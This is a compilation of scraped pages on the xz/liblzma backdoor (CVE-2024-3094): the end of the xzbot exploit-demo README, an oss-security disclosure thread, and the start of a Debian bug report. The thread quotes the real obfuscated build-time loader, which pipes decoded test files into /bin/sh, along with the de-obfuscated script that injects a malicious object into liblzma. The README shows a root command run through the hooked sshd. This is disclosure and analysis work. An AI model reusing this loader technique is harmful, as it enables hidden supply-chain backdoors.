000001f0  86 c3 c9 e2 e6 17 b4 a6  54 ba c3 a1 4c 40 91 be  |........T...L@..|
00000200  91 9a 2b f8 0b 18 61 1c  5e e1 e0 5b e8 00 00 00  |..+...a.^..[....|
00000210  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
...
00000260  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000270  00 00 00 00 00 00 00 00  00 00 00 10 00 00 00 07  |................|
00000280  73 73 68 2d 72 73 61 00  00 00 01 00              |ssh-rsa.....|
2024/03/30 00:00:00 ssh: handshake failed: EOF

```

On the vulnerable server, we can set a watchpoint for the call to `system()`
and observe the command is executed:

```
$ bpftrace -e 'watchpoint:0x07FFFF74B1995:8:x {
    printf("%s (%d): %s\n", comm, pid, str(uptr(reg("di"))))
}'
Attaching 1 probe...
sshd (1234): id > /tmp/.xz

$ cat /tmp/.xz
uid=0(root) gid=0(root) groups=0(root)

```

The process tree after exploitation looks different from a normal sshd
process tree:

```
# normal process tree
$ ssh foo@bar
$ ps -ef --forest
root         765       1  0 17:58 ?        00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root        1026     765  7 18:51 ?        00:00:00  \_ sshd: foo [priv]
foo         1050    1026  0 18:51 ?        00:00:00      \_ sshd: foo@pts/1
foo         1051    1050  0 18:51 pts/1    00:00:00          \_ -bash

# backdoor process tree
$ xzbot -cmd 'sleep 60'
$ ps -ef --forest
root         765       1  0 17:58 ?        00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         941     765  4 18:04 ?        00:00:00  \_ sshd: root [priv]
sshd         942     941  0 18:04 ?        00:00:00      \_ sshd: root [net]
root         943     941  0 18:04 ?        00:00:00      \_ sh -c sleep 60
root         944     943  0 18:04 ?        00:00:00          \_ sleep 60

```

*Note: successful exploitation does not generate any INFO or higher log entries.*

# References

* <https://www.openwall.com/lists/oss-security/2024/03/29/4>
* <https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504>
* <https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01>
* <https://gist.github.com/keeganryan/a6c22e1045e67c17e88a606dfdf95ae4>

## About

notes, honeypot, and exploit demo for the xz backdoor (CVE-2024-3094)

### Resources

[Readme](#readme-ov-file)

[Activity](/amlweems/xzbot/activity)
### Stars

[**3.5k**
stars](/amlweems/xzbot/stargazers)
### Watchers

[**38**
watching](/amlweems/xzbot/watchers)
### Forks

[**240**
forks](/amlweems/xzbot/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Famlweems%2Fxzbot&report=amlweems+%28user%29)

## Languages

* [Go
  73.2%](/amlweems/xzbot/search?l=go)
* [Python
  26.8%](/amlweems/xzbot/search?l=python)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.openwall.com_746b8522_20250111_034001.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](9) [[next>]](11) [[<thread-prev]](7) [[thread-next>]](11) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <ZgcOVnk5hCVkDUt/@ycc.fr>
Date: Fri, 29 Mar 2024 19:54:14 +0100
From: Ivan Delalande <colona@....fr>
To: oss-security@...ts.openwall.com, Andres Freund <andres@...razel.de>,
	Andrew Morton <akpm@...ux-foundation.org>
Subject: Re: backdoor in upstream xz/liblzma leading to ssh
 server compromise

On Fri, Mar 29, 2024 at 08:51:26AM -0700, Andres Freund wrote:
> For which the exploit code was then adjusted:
> <https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89>
>
> Given the activity over several weeks, the committer is either directly
> involved or there was some quite severe compromise of their
> system. Unfortunately the latter looks like the less likely explanation, given
> they communicated on various lists about the "fixes" mentioned above.

Knowing this, I hope the recent kernel patch series involving the same
person to some degree will get extra scrutiny:
[https://lore.kernel.org/lkml/20240320183846.19475-1-lasse.collin@tukaani.org/t/](https://lore.kernel.org/lkml/20240320183846.19475-1-lasse.collin%40tukaani.org/t/)

Thanks Andres, incredible find and write-up!

On Fri, Mar 29, 2024 at 08:51:26AM -0700, Andres Freund wrote:
> After observing a few odd symptoms around liblzma (part of the xz package) on
> Debian sid installations over the last weeks (logins with ssh taking a lot of
> CPU, valgrind errors) I figured out the answer:
>
> The upstream xz repository and the xz tarballs have been backdoored.
>
> At first I thought this was a compromise of debian's package, but it turns out
> to be upstream.
>
>
> == Compromised Release Tarball ==
>
> One portion of the backdoor is *solely in the distributed tarballs*. For
> easier reference, here's a link to debian's import of the tarball, but it is
> also present in the tarballs for 5.6.0 and 5.6.1:
>
> <https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63>
>
> That line is *not* in the upstream source of build-to-host, nor is
> build-to-host used by xz in git.  However, it is present in the tarballs
> released upstream, except for the "source code" links, which I think github
> generates directly from the repository contents:
>
> <https://github.com/tukaani-project/xz/releases/tag/v5.6.0>
> <https://github.com/tukaani-project/xz/releases/tag/v5.6.1>
>
>
> This injects an obfuscated script to be executed at the end of configure. This
> script is fairly obfuscated and data from "test" .xz files in the repository.
>
>
> This script is executed and, if some preconditions match, modifies
> $builddir/src/liblzma/Makefile to contain
>
> am__test = bad-3-corrupt_lzma2.xz
> ...
> am__test_dir=$(top_srcdir)/tests/files/$(am__test)
> ...
> sed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1
>
>
> which ends up as
> ...; sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr "	 \-_" " 	_\-" | xz -d | /bin/bash >/dev/null 2>&1; ...
>
> Leaving out the "| bash" that produces
>
> ####Hello####
> #��Z�.hj�
> eval `grep ^srcdir= config.status`
> if test -f ../../config.status;then
> eval `grep ^srcdir= ../../config.status`
> srcdir="../../$srcdir"
> fi
> export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +724)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|xz -F raw --lzma1 -dc|/bin/sh
> ####World####
>
> After de-obfuscation this leads to the attached injected.txt.
>
>
> == Compromised Repository ==
>
> The files containing the bulk of the exploit are in an obfuscated form in
>   tests/files/bad-3-corrupt_lzma2.xz
>   tests/files/good-large_compressed.lzma
> committed upstream. They were initially added in
> <https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0>
>
> Note that the files were not even used for any "tests" in 5.6.0.
>
>
> Subsequently the injected code (more about that below) caused valgrind errors
> and crashes in some configurations, due the stack layout differing from what
> the backdoor was expecting.  These issues were attempted to be worked around
> in 5.6.1:
>
> <https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad>
> <https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f>
> <https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92>
>
> For which the exploit code was then adjusted:
> <https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89>
>
> Given the activity over several weeks, the committer is either directly
> involved or there was some quite severe compromise of their
> system. Unfortunately the latter looks like the less likely explanation, given
> they communicated on various lists about the "fixes" mentioned above.
>
>
> Florian Weimer first extracted the injected code in isolation, also attached,
> liblzma_la-crc64-fast.o, I had only looked at the whole binary. Thanks!
>
>
> == Affected Systems ==
>
> The attached de-obfuscated script is invoked first after configure, where it
> decides whether to modify the build process to inject the code.
>
> These conditions include targeting only x86-64 linux:
>     if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
>
> Building with gcc and the gnu linker
>     if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
>     exit 0
>     fi
>     if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
>     exit 0
>     fi
>     LDv=$LD" -v"
>     if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
>     exit 0
>
> Running as part of a debian or RPM package build:
>     if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
>
> Particularly the latter is likely aimed at making it harder to reproduce the
> issue for investigators.
>
>
> Due to the working of the injected code (see below), it is likely the backdoor
> can only work on glibc based systems.
>
>
> Luckily xz 5.6.0 and 5.6.1 have not yet widely been integrated by linux
> distributions, and where they have, mostly in pre-release versions.
>
>
> == Observing Impact on openssh server ==
>
> With the backdoored liblzma installed, logins via ssh become a lot slower.
>
> time ssh nonexistant@...alhost
>
> before:
> nonexistant@...alhost: Permission denied (publickey).
>
> before:
> real	0m0.299s
> user	0m0.202s
> sys	0m0.006s
>
> after:
> nonexistant@...alhost: Permission denied (publickey).
>
> real	0m0.807s
> user	0m0.202s
> sys	0m0.006s
>
>
> openssh does not directly use liblzma. However debian and several other
> distributions patch openssh to support systemd notification, and libsystemd
> does depend on lzma.
>
>
> Initially starting sshd outside of systemd did not show the slowdown, despite
> the backdoor briefly getting invoked. This appears to be part of some
> countermeasures to make analysis harder.
>
> Observed requirements for the exploit:
> a) TERM environment variable is not set
> b) argv[0] needs to be /usr/sbin/sshd
> c) LD_DEBUG, LD_PROFILE are not set
> d) LANG needs to be set
> e) Some debugging environments, like rr, appear to be detected. Plain gdb
>    appears to be detected in some situations, but not others
>
> To reproduce outside of systemd, the server can be started with a clear
> environment, setting only the required variable:
>
> env -i LANG=en_US.UTF-8 /usr/sbin/sshd -D
>
>
> In fact, openssh does not need to be started as a server to observe the
> slowdown:
>
> slow:
> env -i LANG=C /usr/sbin/sshd -h
>
> (about 0.5s on my older system)
>
>
> fast:
> env -i LANG=C TERM=foo /usr/sbin/sshd -h
> env -i LANG=C LD_DEBUG=statistics /usr/sbin/sshd -h
> ...
>
> (about 0.01s on the same system)
>
>
> It's possible that argv[0] other /usr/sbin/sshd also would have effect - there
> are obviously lots of servers linking to libsystemd.
>
>
> == Analyzing the injected code ==
>
> I am *not* a security researcher, nor a reverse engineer.  There's lots of
> stuff I have not analyzed and most of what I observed is purely from
> observation rather than exhaustively analyzing the backdoor code.
>
> To analyze I primarily used "perf record -e intel_pt//ub" to observe where
> execution diverges between the backdoor being active and not. Then also gdb,
> setting breakpoints before the divergence.
>
>
> The backdoor initially intercepts execution by replacing the ifunc resolvers
> crc32_resolve(), crc64_resolve() with different code, which calls
> _get_cpuid(), injected into the code (which previously would just be static
> inline functions).  In xz 5.6.1 the backdoor was further obfuscated, removing
> symbol names.
>
> These functions get resolved during startup, because sshd is built with
> -Wl,-z,now, leading to all symbols being resolved early. If started with
> LD_BIND_NOT=1 the backdoor does not appear to work.
>
>
> Below crc32_resolve() _get_cpuid() does not do much, it just sees that a
> 'completed' variable is 0 and increments it, returning the normal cpuid result
> (via a new _cpuid()). It gets to be more interesting during crc64_resolve().
>
> In the second invocation crc64_resolve() appears to find various information,
> like data from the dynamic linker, program arguments and environment. Then it
> perform various environment checks, including those above. There are other
> checks I have not fully traced.
>
> If the above decides to continue, the code appears to be parsing the symbol
> tables in memory. This is the quite slow step that made me look into the issue.
>
>
> Notably liblzma's symbols are resolved before many of the other libraries,
> including the symbols in the main sshd binary.  This is important because
> symbols are resolved, the GOT gets remapped read-only thanks to -Wl,-z,relro.
>
>
> To be able to resolve symbols in libraries that have not yet loaded, the
> backdoor installs an audit hook into the dynamic linker, which can be observed
> with gdb using
>   watch _rtld_global_ro._dl_naudit
> It looks like the audit hook is only installed for the main binary.
>
> That hook gets called, from _dl_audit_symbind, for numerous symbols in the
> main binary. It appears to wait for "RSA_public_decrypt@....plt" to be
> resolved.  When called for that symbol, the backdoor changes the value of
> RSA_public_decrypt@....plt to point to its own code.  It does not do this via
> the audit hook mechanism, but outside of it.
>
> For reasons I do not yet understand, it does change sym.st_value *and* the
> return value of from the audit hook to a different value, which leads
> _dl_audit_symbind() to do nothing - why change anything at all then?
>
> After that the audit hook is uninstalled again.
>
> It is possible to change the got.plt contents at this stage because it has not
> (and can't yet) been remapped to be read-only.
>
>
> I suspect there might be further changes performed at this stage.
>
>
> == Impact on sshd ==
>
> The prior section explains that RSA_public_decrypt@....plt was redirected to
> point into the backdoor code. The trace I was analyzing indeed shows that
> during a pubkey login the exploit code is invoked:
>
>             sshd 1736357 [010] 714318.734008:          1  branches:uH:      5555555ded8c ssh_rsa_verify+0x49c (/usr/sbin/sshd) =>     5555555612d0 RSA_public_decrypt@...+0x0 (/usr/sbin/sshd)
>
> The backdoor then calls back into libcrypto, presumably to perform normal authentication
>
>             sshd 1736357 [010] 714318.734009:          1  branches:uH:      7ffff7c137cd [unknown] (/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.0) =>     7ffff792a2b0 RSA_get0_key+0x0 (/usr/lib/x86_64-linux-gnu/libcrypto.so.3)
>
>
> I have not yet analyzed precisely what is being checked for in the injected
> code, to allow unauthorized access. Since this is running in a
> pre-authentication context, it seems likely to allow some form of access or
> other form of remote code execution.
>
> I'd upgrade any potentially vulnerable system ASAP.
>
>
> == Bug reports ==
>
> Given the apparent upstream involvement I have not reported an upstream
> bug. As I initially thought it was a debian specific issue, I sent a more
> preliminary report to security@...ian.org.  Subsequently I reported the issue
> to distros@. CISA was notified by a distribution.
>
> Red Hat assigned this issue CVE-2024-3094.
>
>
> == Detecting if installation is vulnerable ==
>
> Vegard Nossum wrote a script to detect if it's likely that the ssh binary on a
> system is vulnerable, attached here. Thanks!
>
>
> Greetings,
>
> Andres Freund

> P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
> C="pic_flag=\" $P\""
> O="^pic_flag=\" -fPIC -DPIC\"$"
> R="is_arch_extension_supported"
> x="__get_cpuid("
> p="good-large_compressed.lzma"
> U="bad-3-corrupt_lzma2.xz"
> eval $zrKcVq
> if test -f config.status; then
> eval $zrKcSS
> eval `grep ^LD=\'\/ config.status`
> eval `grep ^CC=\' config.status`
> eval `grep ^GCC=\' config.status`
> eval `grep ^srcdir=\' config.status`
> eval `grep ^build=\'x86_64 config.status`
> eval `grep ^enable_shared=\'yes\' config.status`
> eval `grep ^enable_static=\' config.status`
> eval `grep ^gl_path_map=\' config.status`
> eval $zrKccj
> if ! grep -qs '\["HAVE_FUNC_ATTRIBUTE_IFUNC"\]=" 1"' config.status > /dev/null 2>&1;then
> exit 0
> fi
> if ! grep -qs 'define HAVE_FUNC_ATTRIBUTE_IFUNC 1' config.h > /dev/null 2>&1;then
> exit 0
> fi
> if test "x$enable_shared" != "xyes";then
> exit 0
> fi
> if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
> exit 0
> fi
> if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc64_fast.c > /dev/null 2>&1; then
> exit 0
> fi
> if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc32_fast.c > /dev/null 2>&1; then
> exit 0
> fi
> if ! grep -qs "$R" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
> exit 0
> fi
> if ! grep -qs "$x" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
> exit 0
> fi
> if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
> exit 0
> fi
> if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
> exit 0
> fi
> LDv=$LD" -v"
> if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
> exit 0
> fi
> if ! test -f "$srcdir/tests/files/$p" > /dev/null 2>&1;then
> exit 0
> fi
> if ! test -f "$srcdir/tests/files/$U" > /dev/null 2>&1;then
> exit 0
> fi
> if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
> eval $zrKcst
> j="^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4"
> if ! grep -qs "$j" src/liblzma/Makefile > /dev/null 2>&1;then
> exit 0
> fi
> z="^am__uninstall_files_from_dir = {"
> if ! grep -qs "$z" src/liblzma/Makefile > /dev/null 2>&1;then
> exit 0
> fi
> w="^am__install_max ="
> if ! grep -qs "$w" src/liblzma/Makefile > /dev/null 2>&1;then
> exit 0
> fi
> E=$z
> if ! grep -qs "$E" src/liblzma/Makefile > /dev/null 2>&1;then
> exit 0
> fi
> Q="^am__vpath_adj_setup ="
> if ! grep -qs "$Q" src/liblzma/Makefile > /dev/null 2>&1;then
> exit 0
> fi
> M="^am__include = include"
> if ! grep -qs "$M" src/liblzma/Makefile > /dev/null 2>&1;then
> exit 0
> fi
> L="^all: all-recursive$"
> if ! grep -qs "$L" src/liblzma/Makefile > /dev/null 2>&1;then
> exit 0
> fi
> m="^LTLIBRARIES = \$(lib_LTLIBRARIES)"
> if ! grep -qs "$m" src/liblzma/Makefile > /dev/null 2>&1;then
> exit 0
> fi
> u="AM_V_CCLD = \$(am__v_CCLD_\$(V))"
> if ! grep -qs "$u" src/liblzma/Makefile > /dev/null 2>&1;then
> exit 0
> fi
> if ! grep -qs "$O" libtool > /dev/null 2>&1;then
> exit 0
> fi
> eval $zrKcTy
> b="am__test = $U"
> sed -i "/$j/i$b" src/liblzma/Makefile || true
> d=`echo $gl_path_map | sed 's/\\\/\\\\\\\\/g'`
> b="am__strip_prefix = $d"
> sed -i "/$w/i$b" src/liblzma/Makefile || true
> b="am__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/null | \$(SHELL)"
> sed -i "/$E/i$b" src/liblzma/Makefile || true
> b="\$(top_srcdir)/tests/files/\$(am__test)"
> s="am__test_dir=$b"
> sed -i "/$Q/i$s" src/liblzma/Makefile || true
> h="-Wl,--sort-section=name,-X"
> if ! echo "$LDFLAGS" | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
> h=$h",-z,now"
> fi
> j="liblzma_la_LDFLAGS += $h"
> sed -i "/$L/i$j" src/liblzma/Makefile || true
> sed -i "s/$O/$C/g" libtool || true
> k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"
> sed -i "s/$u/$k/" src/liblzma/Makefile || true
> l="LTDEPS='\$(lib_LTDEPS)'; \\\\\n\
>     export top_srcdir='\$(top_srcdir)'; \\\\\n\
>     export CC='\$(CC)'; \\\\\n\
>     export DEFS='\$(DEFS)'; \\\\\n\
>     export DEFAULT_INCLUDES='\$(DEFAULT_INCLUDES)'; \\\\\n\
>     export INCLUDES='\$(INCLUDES)'; \\\\\n\
>     export liblzma_la_CPPFLAGS='\$(liblzma_la_CPPFLAGS)'; \\\\\n\
>     export CPPFLAGS='\$(CPPFLAGS)'; \\\\\n\
>     export AM_CFLAGS='\$(AM_CFLAGS)'; \\\\\n\
>     export CFLAGS='\$(CFLAGS)'; \\\\\n\
>     export AM_V_CCLD='\$(am__v_CCLD_\$(V))'; \\\\\n\
>     export liblzma_la_LINK='\$(liblzma_la_LINK)'; \\\\\n\
>     export libdir='\$(libdir)'; \\\\\n\
>     export liblzma_la_OBJECTS='\$(liblzma_la_OBJECTS)'; \\\\\n\
>     export liblzma_la_LIBADD='\$(liblzma_la_LIBADD)'; \\\\\n\
> sed rpath \$(am__test_dir) | \$(am__dist_setup) >/dev/null 2>&1";
> sed -i "/$m/i$l" src/liblzma/Makefile || true
> eval $zrKcHD
> fi
> elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_fast.o); then
> eval $zrKcKQ
> if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc64_fast.c; then
> exit 0
> fi
> if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc32_fast.c; then
> exit 0
> fi
> if ! grep -qs "$R" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
> exit 0
> fi
> if ! grep -qs "$x" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
> exit 0
> fi
> if ! grep -qs "$C" ../../libtool; then
> exit 0
> fi
> if ! echo $liblzma_la_LINK | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
> exit 0
> fi
> if echo $liblzma_la_LINK | grep -qs -e "lazy" > /dev/null 2>&1;then
> exit 0
> fi
> N=0
> W=0
> Y=`grep "dnl Convert it to C string syntax." $top_srcdir/m4/gettext.m4`
> eval $zrKcjv
> if test -z "$Y"; then
> N=0
> W=88792
> else
> N=88792
> W=0
> fi
> xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<4096;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t["x" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf "%c",(v+k)%m}' | xz -dc --single-stream | ((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o || true
> if ! test -f liblzma_la-crc64-fast.o; then
> exit 0
> fi
> cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true
> V='#endif\n#if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) && defined(CRC_X86_CLMUL) && defined(CRC_USE_IFUNC) && defined(PIC) && (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\nextern int _get_cpuid(int, void*, void*, void*, void*, void*);\nstatic inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4]; success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16); const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19); return success && (r[2] & ecx_mask) == ecx_mask; }\n#else\n#define _is_arch_extension_supported is_arch_extension_supported'
> eval $yosA
> if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc64_fast.c | \
> sed "/include \"crc_x86_clmul.h\"/a \\$V" | \
> sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc64_fast.c\"" 2>/dev/null | \
> $CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2>/dev/null; then
> cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true
> eval $BPep
> if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc32_fast.c | \
> sed "/include \"crc32_arm64.h\"/a \\$V" | \
> sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc32_fast.c\"" 2>/dev/null | \
> $CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then
> eval $RgYB
> if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then
> if test ! -f .libs/liblzma.so; then
> mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
> mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
> fi
> rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true
> else
> mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
> mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
> fi
> rm -f .libs/liblzma_la-crc32-fast.o || true
> rm -f .libs/liblzma_la-crc64-fast.o || true
> else
> mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
> mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
> fi
> else
> mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
> fi
> rm -f liblzma_la-crc64-fast.o || true
> fi
> eval $DHLd

--
Ivan Delalande

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from bugs.debian.org_bf1dfabb_20250111_034009.html ===

# Debian Bug report logs - #1068024 revert to version that does not contain changes by bad actor

[![version graph](version.cgi?collapse=1;found=xz-utils%2F5.6.1%2Breally5.4.5-1;width=2;height=2;absolute=0;package=xz-utils)](version.cgi?collapse=1;package=xz-utils;absolute=0;found=xz-utils%2F5.6.1%2Breally5.4.5-1;info=1)

Package:
[xz-utils](pkgreport.cgi?package=xz-utils);
Maintainer for [xz-utils](pkgreport.cgi?package=xz-utils) is [Sebastian Andrzej Siewior <sebastian@breakpoint.cc>](pkgreport.cgi?maint=sebastian%40breakpoint.cc); Source for [xz-utils](pkgreport.cgi?package=xz-utils) is [src:xz-utils](pkgreport.cgi?src=xz-utils) ([PTS](https://tracker.debian.org/pkg/xz-utils), [buildd](https://buildd.debian.org/xz-utils), [popcon](https://qa.debian.org/popcon.php?package=xz-utils)).

Reported by: [Joey Hess <id@joeyh.name>](pkgreport.cgi?submitter=id%40joeyh.name)

Date: Fri, 29 Mar 2024 20:36:01 UTC

Severity: important

Tags: security

Found in version xz-utils/5.6.1+really5.4.5-1

Forwarded to <https://tukaani.org/xz-backdoor/>

Reply or subscribe to this bug.

Display info messages

View this report as an [mbox folder](bugreport.cgi?bug=1068024;mbox=yes), [status mbox](bugreport.cgi?bug=1068024;mbox=yes;mboxstatus=yes), [maintainer mbox](bugreport.cgi?bug=1068024;mbox=yes;mboxmaint=yes)

---

**Report forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Fri, 29 Mar 2024 20:36:04 GMT) ([full text](bugreport.cgi?bug=1068024;msg=2), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=2), [link](#1)).

---

**Acknowledgement sent**
to `Joey Hess <id@joeyh.name>`:

New Bug report received and forwarded. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Fri, 29 Mar 2024 20:36:04 GMT) ([full text](bugreport.cgi?bug=1068024;msg=4), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=4), [link](#3)).

---

[Message #5](#5) received at submit@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=5), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=5), reply):

